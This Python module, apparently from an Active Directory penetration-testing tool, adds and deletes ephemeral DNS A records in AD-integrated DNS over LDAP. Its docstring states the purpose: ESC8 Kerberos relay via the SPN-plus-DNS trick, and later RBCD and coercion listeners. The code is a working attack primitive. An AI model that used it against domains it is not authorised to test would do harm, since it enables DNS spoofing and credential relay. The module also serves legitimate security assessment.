"""AD-Integrated DNS (ADIDNS) write primitives.

Manages dnsNode objects in the DomainDnsZones partition via LDAP.
Reusable for any workflow that needs ephemeral DNS A records:
  - ESC8 Kerberos relay (SPN + DNS trick)
  - RBCD setup (future)
  - Coercion listener aliasing (future)

All sync LDAP calls use ADscanLDAPConnection with LDAPS→LDAP fallback.
Call from async contexts via asyncio.to_thread.
"""

from __future__ import annotations

import contextlib
import socket
import struct
from dataclasses import dataclass
from typing import AsyncIterator

from adscan_core import telemetry
from adscan_internal.rich_output import (
    mark_sensitive,
    print_error,
    print_info_debug,
    print_success,
    print_warning,
)
from adscan_internal.services.ldap_transport_service import (
    ADscanLDAPConfig,
    ADscanLDAPConnection,
)

import asyncio
from adscan_core.rich_output import print_exception


@dataclass(frozen=True)
class ADIDNSConfig:
    """Connection config for AD-integrated DNS writes."""

    dc_ip: str
    domain: str
    username: str
    password: str
    zone: str = ""  # defaults to domain if empty

    @property
    def effective_zone(self) -> str:
        return self.zone or self.domain


@dataclass
class ADIDNSRecord:
    """Handle for a created DNS A record — needed for cleanup."""

    hostname: str
    ip: str
    fqdn: str
    node_dn: str
    zone_dn: str


# ---------------------------------------------------------------------------
# DNS binary encoding — [MS-DNSP] §2.3.2.2 DNS_RECORD
# ---------------------------------------------------------------------------

def _build_dns_a_record(ip: str, serial: int = 1, ttl: int = 180) -> bytes:
    """Encode an A record as a dnsRecord binary blob per [MS-DNSP] §2.3.2.2."""
    data = socket.inet_aton(ip)  # 4 bytes, network order
    data_len = len(data)         # 4

    # DNS_RECORD header fields (mixed endianness):
    #   DataLength(2LE) Type(2LE) Version(1) Rank(1) Flags(2LE) Serial(4LE)
    prefix = struct.pack("<HHBBHL", data_len, 1, 5, 240, 0, serial)
    #   TtlSeconds(4BE)  Reserved(4LE)  TimeStamp(4LE)
    middle = struct.pack(">L", ttl) + struct.pack("<LL", 0, 0)

    return prefix + middle + data


def _domain_to_config_dn(domain: str) -> str:
    return ",".join(f"DC={part}" for part in domain.split("."))


def _zone_dn(zone: str, domain_dn: str) -> str:
    return f"DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}"


def _node_dn(hostname: str, zone: str, domain_dn: str) -> str:
    return f"DC={hostname},{_zone_dn(zone, domain_dn)}"


# ---------------------------------------------------------------------------
# LDAP operations (synchronous — call via asyncio.to_thread)
# ---------------------------------------------------------------------------

def _ldap_cfg(config: ADIDNSConfig) -> ADscanLDAPConfig:
    return ADscanLDAPConfig(
        domain=config.domain,
        dc_ip=config.dc_ip,
        use_ldaps=True,
        use_kerberos=False,
        username=config.username,
        password=config.password,
    )


def _get_soa_serial(zone: str, dc_ip: str) -> int:
    """Query SOA serial for the zone. Returns current_serial+1 (next serial to use)."""
    try:
        import dns.resolver  # type: ignore[import]
        resolver = dns.resolver.Resolver(configure=False)
        resolver.nameservers = [dc_ip]
        answers = resolver.resolve(zone, "SOA")
        return answers[0].serial + 1
    except Exception:
        return 1


def _add_a_record_sync(config: ADIDNSConfig, hostname: str, ip: str, ttl: int = 180) -> ADIDNSRecord:
    """Create a dnsNode A record in ADIDNS. Raises on failure."""
    domain_dn = _domain_to_config_dn(config.domain)
    zone = config.effective_zone
    z_dn = _zone_dn(zone, domain_dn)
    n_dn = _node_dn(hostname, zone, domain_dn)
    fqdn = f"{hostname}.{zone}"

    serial = _get_soa_serial(zone, config.dc_ip)
    record_bytes = _build_dns_a_record(ip, serial=serial, ttl=ttl)

    with ADscanLDAPConnection(_ldap_cfg(config)) as conn:
        # Check if the node already exists
        conn.search(
            search_base=z_dn,
            search_filter=f"(&(objectClass=dnsNode)(name={hostname}))",
            attributes=["dnsRecord", "dNSTombstoned"],
        )
        existing = conn.entries

        if existing:
            # Node exists: add the A record to its dnsRecord attribute
            ok = conn.modify(n_dn, {"dnsRecord": [("add", [record_bytes])]})
            if not ok:
                raise RuntimeError(
                    f"ADIDNS: failed to add A record to existing node {n_dn}"
                )
            print_info_debug(f"ADIDNS: added A record to existing node {fqdn!r} → {ip}")
        else:
            # Node does not exist: create it.
            # objectCategory is intentionally omitted — krbrelayx/dnstool reference
            # shows this causes AD DNS to silently ignore the record.
            node_attrs = {
                "dNSTombstoned": False,
                "name": hostname,
                "dnsRecord": [record_bytes],
            }
            ok = conn.add(n_dn, ["top", "dnsNode"], node_attrs)
            if not ok:
                raise RuntimeError(
                    f"ADIDNS: failed to create dnsNode {n_dn}"
                )
            print_info_debug(f"ADIDNS: created dnsNode {fqdn!r} → {ip}")

    return ADIDNSRecord(hostname=hostname, ip=ip, fqdn=fqdn, node_dn=n_dn, zone_dn=z_dn)


def _delete_record_sync(config: ADIDNSConfig, record: ADIDNSRecord) -> bool:
    """Delete the dnsNode via LDAP. Returns True on success."""
    try:
        with ADscanLDAPConnection(_ldap_cfg(config)) as conn:
            ok = conn.delete(record.node_dn)
            if ok:
                print_info_debug(f"ADIDNS: deleted dnsNode {record.fqdn!r}")
            else:
                print_warning(
                    f"ADIDNS: could not delete dnsNode {record.fqdn!r} — "
                    f"manual cleanup: delete {record.node_dn}"
                )
            return bool(ok)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_error(
            f"ADIDNS: exception deleting {record.fqdn!r} — "
            f"manual cleanup required: {exc}"
        )
        return False


# ---------------------------------------------------------------------------
# Async wrappers
# ---------------------------------------------------------------------------

async def adidns_add_a_record(
    config: ADIDNSConfig,
    hostname: str,
    ip: str,
    ttl: int = 180,
) -> ADIDNSRecord:
    """Add a DNS A record to ADIDNS. Async wrapper around sync LDAP operation."""
    return await asyncio.to_thread(_add_a_record_sync, config, hostname, ip, ttl)


async def adidns_delete_record(config: ADIDNSConfig, record: ADIDNSRecord) -> bool:
    """Delete an ADIDNS record. Async wrapper around sync LDAP operation."""
    return await asyncio.to_thread(_delete_record_sync, config, record)


@contextlib.asynccontextmanager
async def adidns_a_record_scope(
    config: ADIDNSConfig,
    hostname: str,
    ip: str,
    ttl: int = 180,
) -> AsyncIterator[ADIDNSRecord]:
    """RAII context: add DNS A record on enter, delete on exit (even on exception)."""
    record = await adidns_add_a_record(config, hostname, ip, ttl)
    print_success(
        f"ADIDNS: added A record {mark_sensitive(record.fqdn, 'hostname')} → "
        f"{mark_sensitive(ip, 'ip')} (TTL {ttl}s)"
    )
    try:
        yield record
    finally:
        deleted = await adidns_delete_record(config, record)
        if deleted:
            print_success(f"ADIDNS: removed A record {mark_sensitive(record.fqdn, 'hostname')}")
        else:
            print_warning(
                f"ADIDNS: failed to remove {mark_sensitive(record.fqdn, 'hostname')} — "
                f"manual cleanup: ldapdelete {record.node_dn}"
            )
